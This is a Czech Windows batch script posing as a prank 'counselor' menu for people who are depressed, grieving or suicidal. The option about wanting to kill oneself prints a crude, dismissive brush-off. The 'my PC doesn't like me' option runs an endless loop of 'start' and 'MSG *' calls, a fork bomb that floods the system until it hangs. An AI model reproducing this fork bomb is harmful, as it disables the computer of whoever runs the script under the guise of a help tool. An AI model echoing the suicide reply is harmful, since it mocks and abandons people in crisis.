@echo off
color 0a
:selecc
cls
echo Dobry den. Jsem skidnutej poradce, ktery ti zachrani zivot.
echo Date : %date%
echo ---------------------
echo 1) Mam deprese
echo 2) Chci se zabit
echo 3) Zlepsi mi naladu citatem
echo 4) Muj pc me nema rad co s tim ?
echo 5) Prisel jsem o svou milovanou co mam delat ?
set /p reply=Enter your choice: 
if %reply%==1 goto deprese
if %reply%==2 goto chci_se_zabit
if %reply%==3 goto tersch_meme
if %reply%==4 goto rip
if %reply%==5 goto F
:deprese
cls
echo Ja taky :c
pause
cls
goto selecc
:chci_se_zabit
cls
echo A co ja jako s tim ? Vypadam ze jsem zivi ? Jestli se chces zabit, me s tim neser dik.
pause
cls
goto selecc
:tersch_meme
cls
echo "jo, bude tady anarchie, nebo monarchie, idk"
echo -starsex 2020
pause
cls
goto selecc
:rip
cls
echo Tvuju PC je peknej hajzl a doufam, ze chcipne. A vis co ? Pomuzem mu s tim ;)
:B
title chcipni
echo chcipni
MSG * ZDECHNI
start 
goto B
cls
goto selecc
:F
title F
echo F
MSG * F
exit